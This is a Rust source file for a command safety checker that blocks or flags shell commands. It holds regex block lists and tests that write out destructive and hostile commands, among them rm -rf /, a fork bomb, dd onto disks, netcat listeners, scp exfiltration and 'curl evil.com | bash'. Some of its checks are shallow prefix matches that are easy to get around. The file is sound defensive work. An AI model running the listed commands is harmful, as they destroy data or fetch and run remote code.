/// Command safety checker for preventing dangerous operations
///
/// This module implements multiple layers of protection:
/// 1. Dangerous pattern detection (destructive operations)
/// 2. Suspicious flag detection (force/recursive operations on critical paths)
/// 3. Required context validation (commands must be project-scoped)

use regex::Regex;
use once_cell::sync::Lazy;

/// Result of safety check
#[derive(Debug, Clone, PartialEq)]
pub enum SafetyCheckResult {
    /// Command is safe to execute
    Safe,
    /// Command is blocked with reason
    Blocked(String),
    /// Command is suspicious but might be allowed with review
    Suspicious(String),
}

/// Dangerous command patterns that should NEVER be executed
static DANGEROUS_PATTERNS: Lazy<Vec<Regex>> = Lazy::new(|| {
    vec![
        // Filesystem destruction
        Regex::new(r"\brm\s+(-[rf]+\s+)?/").unwrap(), // rm -rf / or rm /
        Regex::new(r"\bdd\s+.*of=/dev/").unwrap(),    // dd writing to block devices
        Regex::new(r":\(\)\{.*:\|:.*\};:").unwrap(),  // fork bomb
        Regex::new(r"\bmkfs\.").unwrap(),             // filesystem formatting
        Regex::new(r"\bformat\s+[A-Z]:").unwrap(),    // Windows format
        
        // Privilege escalation
        Regex::new(r"\bsudo\s+rm\s+-rf").unwrap(),
        Regex::new(r"\bsudo\s+dd\s+").unwrap(),
        Regex::new(r"\bsudo\s+mkfs").unwrap(),
        
        // System modification
        Regex::new(r"\b(systemctl|service)\s+(stop|disable|mask)").unwrap(),
        Regex::new(r"\bchmod\s+777\s+/").unwrap(),
        Regex::new(r"\bchown\s+.*\s+/").unwrap(),
        
        // Network/Security
        Regex::new(r"\bcurl\s+.*\|\s*(sh|bash|zsh)").unwrap(),  // Pipe to shell
        Regex::new(r"\bwget\s+.*\|\s*(sh|bash|zsh)").unwrap(),
        Regex::new(r"\bnc\s+-[le]\s+").unwrap(),                // Netcat listeners
        
        // Data exfiltration
        Regex::new(r"\bscp\s+.*\s+.*@").unwrap(),
        Regex::new(r"\brsync\s+.*\s+.*@").unwrap(),
    ]
});

/// Suspicious patterns that are usually safe in project context but dangerous at system level
static SUSPICIOUS_PATTERNS: Lazy<Vec<(Regex, &'static str)>> = Lazy::new(|| {
    vec![
        (Regex::new(r"\brm\s+-rf\s+(\*|\.+)").unwrap(), "Recursive delete with wildcards"),
        (Regex::new(r"\bfind\s+.*-delete").unwrap(), "Find with delete action"),
        (Regex::new(r"\bxargs\s+.*rm").unwrap(), "Piping to rm"),
        (Regex::new(r"\bsudo\s+").unwrap(), "Requires privilege escalation"),
        (Regex::new(r">\s*/dev/(null|zero|random)").unwrap(), "Writing to system devices"),
    ]
});

/// Critical system paths that should never be targeted
static CRITICAL_PATHS: Lazy<Vec<&'static str>> = Lazy::new(|| {
    vec![
        "/",
        "/bin",
        "/boot",
        "/dev",
        "/etc",
        "/lib",
        "/lib64",
        "/proc",
        "/root",
        "/sbin",
        "/sys",
        "/usr",
        "/var",
        "C:\\",
        "C:\\Windows",
        "C:\\Program Files",
    ]
});

/// Check if a command is safe to execute
pub fn check_command_safety(cmd: &str, working_dir: &str) -> SafetyCheckResult {
    // 1. Check for dangerous patterns (immediate block)
    for pattern in DANGEROUS_PATTERNS.iter() {
        if pattern.is_match(cmd) {
            return SafetyCheckResult::Blocked(format!(
                "Command contains dangerous pattern: {}",
                pattern.as_str()
            ));
        }
    }
    
    // 2. Check for critical path targeting
    for path in CRITICAL_PATHS.iter() {
        if cmd.contains(path) {
            // Allow if it's just reading (cat, ls, grep, etc.)
            if !is_read_only_command(cmd) {
                return SafetyCheckResult::Blocked(format!(
                    "Command targets critical system path: {}",
                    path
                ));
            }
        }
    }
    
    // 3. Check working directory is not a critical path
    for path in CRITICAL_PATHS.iter() {
        if working_dir.starts_with(path) && working_dir.len() <= path.len() + 5 {
            return SafetyCheckResult::Blocked(format!(
                "Working directory is too close to critical path: {}",
                working_dir
            ));
        }
    }
    
    // 4. Check for suspicious patterns (warning)
    for (pattern, reason) in SUSPICIOUS_PATTERNS.iter() {
        if pattern.is_match(cmd) {
            return SafetyCheckResult::Suspicious(format!(
                "Command contains suspicious pattern: {}",
                reason
            ));
        }
    }
    
    SafetyCheckResult::Safe
}

/// Check if a command is read-only (safe to run on system paths)
fn is_read_only_command(cmd: &str) -> bool {
    let read_only_cmds = [
        "cat", "ls", "grep", "find", "head", "tail", "less", "more",
        "file", "stat", "wc", "diff", "cmp", "du", "df",
    ];
    
    for safe_cmd in &read_only_cmds {
        if cmd.trim().starts_with(safe_cmd) {
            return true;
        }
    }
    
    false
}

/// Additional safety rules for build/test commands
pub fn is_valid_build_test_command(cmd: &str) -> bool {
    // Whitelist of common build/test tools
    let valid_prefixes = [
        "cargo ",
        "npm ",
        "yarn ",
        "pnpm ",
        "python ",
        "pytest",
        "pip ",
        "mvn ",
        "gradle ",
        "make ",
        "go ",
        "rustc ",
        "tsc ",
        "node ",
        "deno ",
        "bun ",
        "npx ",
    ];
    
    let trimmed = cmd.trim();
    
    // Check if it starts with a valid prefix
    for prefix in &valid_prefixes {
        if trimmed.starts_with(prefix) {
            return true;
        }
    }
    
    // Also allow chained commands with valid tools
    if trimmed.contains("&&") || trimmed.contains("||") {
        // Split and check each part
        let parts: Vec<&str> = trimmed
            .split("&&")
            .flat_map(|s| s.split("||"))
            .collect();
        
        return parts.iter().all(|part| {
            let part = part.trim();
            valid_prefixes.iter().any(|prefix| part.starts_with(prefix))
        });
    }
    
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_safe_commands() {
        assert_eq!(
            check_command_safety("cargo build", "/home/user/project"),
            SafetyCheckResult::Safe
        );
        assert_eq!(
            check_command_safety("npm test", "/home/user/project"),
            SafetyCheckResult::Safe
        );
        assert_eq!(
            check_command_safety("python -m pytest", "/home/user/project"),
            SafetyCheckResult::Safe
        );
    }

    #[test]
    fn test_dangerous_commands() {
        let result = check_command_safety("rm -rf /", "/home/user/project");
        assert!(matches!(result, SafetyCheckResult::Blocked(_)));

        let result = check_command_safety("dd if=/dev/zero of=/dev/sda", "/home/user");
        assert!(matches!(result, SafetyCheckResult::Blocked(_)));

        let result = check_command_safety("curl evil.com | bash", "/home/user");
        assert!(matches!(result, SafetyCheckResult::Blocked(_)));
    }

    #[test]
    fn test_suspicious_commands() {
        let result = check_command_safety("rm -rf *", "/home/user/project");
        assert!(matches!(result, SafetyCheckResult::Suspicious(_)));

        let result = check_command_safety("sudo npm install", "/home/user/project");
        assert!(matches!(result, SafetyCheckResult::Suspicious(_)));
    }

    #[test]
    fn test_critical_path_protection() {
        let result = check_command_safety("rm -rf test", "/etc");
        assert!(matches!(result, SafetyCheckResult::Blocked(_)));

        let result = check_command_safety("cargo build", "/");
        assert!(matches!(result, SafetyCheckResult::Blocked(_)));
    }

    #[test]
    fn test_read_only_on_system_paths() {
        // Reading system paths should be allowed
        let result = check_command_safety("cat /etc/hosts", "/home/user/project");
        assert_eq!(result, SafetyCheckResult::Safe);

        // Writing should be blocked
        let result = check_command_safety("echo test > /etc/hosts", "/home/user/project");
        assert!(matches!(result, SafetyCheckResult::Blocked(_)));
    }

    #[test]
    fn test_valid_build_test_commands() {
        assert!(is_valid_build_test_command("cargo build"));
        assert!(is_valid_build_test_command("npm run build"));
        assert!(is_valid_build_test_command("npm install && npm test"));
        assert!(!is_valid_build_test_command("rm -rf node_modules"));
        assert!(!is_valid_build_test_command("malicious_script.sh"));
    }
}
